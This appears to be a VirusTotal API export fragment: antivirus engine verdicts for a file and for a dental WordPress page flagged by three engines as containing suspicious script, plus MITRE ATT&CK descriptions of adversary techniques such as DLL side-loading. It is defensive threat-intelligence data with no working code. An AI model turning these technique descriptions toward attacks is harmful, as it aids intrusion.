          "engine_update": "20240108"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-24.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Cylance": {
          "category": "undetected",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "AVG": {
          "category": "undetected",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240124"
        },
        "DeepInstinct": {
          "category": "undetected",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240122"
        },
        "CrowdStrike": {
          "category": "undetected",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231026"
        }
      },
      "reputation": 0,
      "first_seen_itw_date": 1349082820
    },
    "type": "file",
    "id": "c9c063a934f85d3a72709f2ca824dc6b7155268ad4f73da3493908cb4d1a3138",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c9c063a934f85d3a72709f2ca824dc6b7155268ad4f73da3493908cb4d1a3138"
    }
  },
  "mitre": {
    "data": {
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Tries to load missing DLLs"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1574/002/",
                "id": "T1574.002",
                "name": "DLL Side-Loading"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "CAPA": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "parse PE header"
                  },
                  {
                    "severity": "INFO",
                    "description": "link function at runtime on Windows"
                  },
                  {
                    "severity": "INFO",
                    "description": "link many functions at runtime"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1129/",
                "id": "T1129",
                "name": "Shared Modules"
              },
              {
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "accept command line arguments"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1059/",
                "id": "T1059",
                "name": "Command and Scripting Interpreter"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "get system information on Windows"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/c9c063a934f85d3a72709f2ca824dc6b7155268ad4f73da3493908cb4d1a3138/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fae948448ff030e4869a"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T1F1B39FD8719990364AB2EEA336E0BB2A851758E6FD406C8FA0D38F55E450D813F5374F",
      "vhash": "htm:973b719f56b65fdb2c8bcc7dd24bf753",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706357156,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 110724,
      "type_extension": "html",
      "html_info": {
        "html_meta": {
          "keywords": [
            "Dental Procedures, Root Canal, Teeth And Dentistry, Tooth Care"
          ],
          "robots": [
            "index,follow,noodp,noydir"
          ],
          "generator": [
            "WordPress 4.9.18"
          ],
          "description": [
            "Root Canal – Feb"
          ]
        },
        "title": "Feb | Root Canal",
        "hrefs": [
          "http://www.root-canal.biz/wp-content/themes/glass/style.css",
          "http://www.root-canal.biz/feed/",
          "http://www.root-canal.biz/feed/atom/",
          "http://www.root-canal.biz/xmlrpc.php",
          "http://www.web-strategy.jp/",
          "//s.w.org",
          "http://www.root-canal.biz/tag/feb/feed/",
          "http://www.root-canal.biz/wp-content/plugins/contextual-related-posts/css/default-style.css?ver=4.9.18",
          "http://www.root-canal.biz/wp-json/",
          "http://www.root-canal.biz/xmlrpc.php?rsd",
          "http://www.root-canal.biz/wp-includes/wlwmanifest.xml",
          "http://www.root-canal.biz/tag/feb/",
          "http://www.root-canal.biz/",
          "http://www.root-canal.biz/2012/12/sensitive-teeth-after-crowns/",
          "http://www.root-canal.biz/category/root-canal/",
          "http://www.root-canal.biz/tag/abscess/",
          "http://www.root-canal.biz/tag/barrel/",
          "http://www.root-canal.biz/tag/boynton/",
          "http://www.root-canal.biz/tag/call/",
          "http://www.root-canal.biz/tag/choosing/",
          "http://www.root-canal.biz/tag/cracked-teeth/",
          "http://www.root-canal.biz/tag/crown/",
          "http://www.root-canal.biz/tag/crowns/",
          "http://www.root-canal.biz/tag/dartboard/",
          "http://www.root-canal.biz/tag/decay/",
          "http://www.root-canal.biz/tag/dental-implant-surgery/",
          "http://www.root-canal.biz/tag/dental-office/",
          "http://www.root-canal.biz/tag/dental-work/",
          "http://www.root-canal.biz/tag/doctor/",
          "http://www.root-canal.biz/tag/downtown-library/",
          "http://www.root-canal.biz/tag/editor/",
          "http://www.root-canal.biz/tag/endodontist/",
          "http://www.root-canal.biz/tag/free/",
          "http://www.root-canal.biz/tag/friday/",
          "http://www.root-canal.biz/tag/gum/",
          "http://www.root-canal.biz/tag/gum-treatment/",
          "http://www.root-canal.biz/tag/implant/",
          "http://www.root-canal.biz/tag/incision/",
          "http://www.root-canal.biz/tag/jan/",
          "http://www.root-canal.biz/tag/laser/",
          "http://www.root-canal.biz/tag/lectureson/",
          "http://www.root-canal.biz/tag/library/",
          "http://www.root-canal.biz/tag/lip/",
          "http://www.root-canal.biz/tag/metal/",
          "http://www.root-canal.biz/tag/metal-bands/",
          "http://www.root-canal.biz/tag/mine/",
          "http://www.root-canal.biz/tag/need/",
          "http://www.root-canal.biz/tag/new/",
          "http://www.root-canal.biz/tag/office/",
          "http://www.root-canal.biz/tag/palm-beach/",
          "http://www.root-canal.biz/tag/predicament/",
          "http://www.root-canal.biz/tag/professor/",
          "http://www.root-canal.biz/tag/pulp/",
          "http://www.root-canal.biz/tag/question/",
          "http://www.root-canal.biz/tag/response/",
          "http://www.root-canal.biz/tag/root/",
          "http://www.root-canal.biz/tag/root-canal-2/",
          "http://www.root-canal.biz/tag/root-canal-specialist/",
          "http://www.root-canal.biz/tag/root-canal-treatment/",
          "http://www.root-canal.biz/tag/seminar/",
          "http://www.root-canal.biz/tag/sensitive/",
          "http://www.root-canal.biz/tag/sensitive-teeth/",
          "http://www.root-canal.biz/tag/sensitivity/",
          "http://www.root-canal.biz/tag/something/",
          "http://www.root-canal.biz/tag/specialist/",
          "http://www.root-canal.biz/tag/staff/",
          "http://www.root-canal.biz/tag/statement/",
          "http://www.root-canal.biz/tag/surgery/",
          "http://www.root-canal.biz/tag/temperature/",
          "http://www.root-canal.biz/tag/temperature-sensitivity/",
          "http://www.root-canal.biz/tag/thing/",
          "http://www.root-canal.biz/tag/thursday/",
          "http://www.root-canal.biz/tag/time/",
          "http://www.root-canal.biz/tag/tooth/",
          "http://www.root-canal.biz/tag/tooth-pulp/",
          "http://www.root-canal.biz/tag/topics/",
          "http://www.root-canal.biz/tag/treatment/",
          "http://www.root-canal.biz/tag/truth/",
          "http://www.root-canal.biz/tag/truth-of-the-matter/",
          "http://www.root-canal.biz/tag/veneers/",
          "http://www.root-canal.biz/tag/west-palm-beach/",
          "http://www.root-canal.biz/tag/work/",
          "http://www.root-canal.biz/2012/12/sensitive-teeth-after-crowns/#respond",
          "http://www.root-canal.biz/2012/12/dux-dental-outfits-143000-pediatric-patients-with-disposable-bib-holders-for-give-kids-a-smile-2013-campaign/",
          "http://www.root-canal.biz/category/dental-procedures/",
          "http://www.globenewswire.com/newsroom/ctr?d=10015898l=1a=Give%20Kids%20a%20Smileu=http%3A%2F%2Fwww.ada.org%2Fgivekidsasmile.aspx",
          "http://www.globenewswire.com/newsroom/ctr?d=10015898l=1a=DUX%20Dentalu=http%3A%2F%2Fwww.duxdental.com",
          "http://www.root-canal.biz/tag/american/",
          "http://www.root-canal.biz/tag/american-dental-association/",
          "http://www.root-canal.biz/tag/association/",
          "http://www.root-canal.biz/tag/awareness/",
          "http://www.root-canal.biz/tag/bacterial-contaminants/",
          "http://www.root-canal.biz/tag/better-health-care/",
          "http://www.root-canal.biz/tag/california/",
          "http://www.root-canal.biz/tag/campaign/",
          "http://www.root-canal.biz/tag/city/",
          "http://www.root-canal.biz/tag/clinic/",
          "http://www.root-canal.biz/tag/collaboration/",
          "http://www.root-canal.biz/tag/contact/",
          "http://www.root-canal.biz/tag/contamination-hazards/"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6d8fc7199a7e163351052956732f0ffcbb8f7fbf81c07eb296abf51f63ffff51"
          },
          {
            "attributes": {
              "src": "http://www.root-canal.biz/wp-includes/js/jquery/jquery.js?ver=1.12.4",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.root-canal.biz/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.root-canal.biz/wp-content/plugins/RSSPoster_PRO/js/functions.js?ver=4.9.18",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "http://www.root-canal.biz/wp-content/themes/glass/js/scroll.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "8c00965c61ca630e8d28718cfd7ef57dda45568d28ff49034d1f7adeead48af5"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "4bfff52d9642524e2258ab1593eb4fac0380127cddd4ad008d3666c4a6a30b27"
          },
          {
            "attributes": {
              "src": "http://xslt.alexa.com/site_stats/js/t/a?url=www.zdentalgroup.com",
              "type": "text/javascript",
              "language": "JavaScript"
            }
          },
          {
            "attributes": {
              "src": "http://www.root-canal.biz/wp-includes/js/wp-embed.min.js?ver=4.9.18",
              "type": "text/javascript"
            }
          }
        ]
      },
      "last_submission_date": 1696617690,
      "reputation": -7,
      "trid": [
        {
          "file_type": "HyperText Markup Language with DOCTYPE",
          "probability": 80.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 19.3
        }
      ],
      "sha256": "d59460912d910d828d288cd433c07acf6c4a52997355267da7b58862a48d68b5",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696617690,
      "unique_sources": 1,
      "first_submission_date": 1696617690,
      "ssdeep": "1536:Gpp2lYMW6iUBCgRe1RcZTvt7Z/2GFzH1ZaZuzdNMLT6Y44fp6/vGH7CDs7J/83Wa:up2CL+Ycj7Z//ZagbDY4/nUbJoWY4+",
      "md5": "7a2e0de1eea31240aa589cf2cf69a657",
      "sha1": "0f920866ef7a1ed2c4f21e4ea3dfa513d4b27338",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (5876u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 3,
        "undetected": 57
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49803",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49803",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.552",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28029",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "HTML:Script-inf [Susp]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Ikarus": {
          "category": "undetected",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
